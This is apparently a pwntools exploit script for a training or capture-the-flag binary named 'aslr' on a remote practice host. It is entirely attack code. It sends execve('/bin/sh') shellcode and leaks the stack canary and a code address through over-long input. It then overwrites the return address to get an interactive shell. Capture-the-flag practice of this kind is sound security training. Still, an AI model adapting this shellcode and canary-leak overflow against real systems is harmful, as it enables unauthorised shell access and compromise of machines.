from pwn import *
import time
'''
context.terminal = ['tmux', 'splitw', '-h']
r = process("./aslr")
gdb.attach(r, """
	c
	""")
'''
r = remote("training.jinblack.it", 2012)

shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8
r.send(shellcode)
time.sleep(0.1)

r.send("B"*105)
time.sleep(0.1)
r.recvuntil("> ")
r.recv(105)
canary = u64(b"\x00" + r.recv(7))
print("canary 0x%x" % canary)

offset = 0x2005c0
r.send("A"*112)
time.sleep(0.1)
r.recvuntil("> ")
r.recv(112)
add = u64(r.recv(8) + b"\x00" + b"\x00") 
add = add + offset
payload = b"a"*104 + p64(canary) + b"b"*8 + p64(add)
r.send(payload)

r.interactive()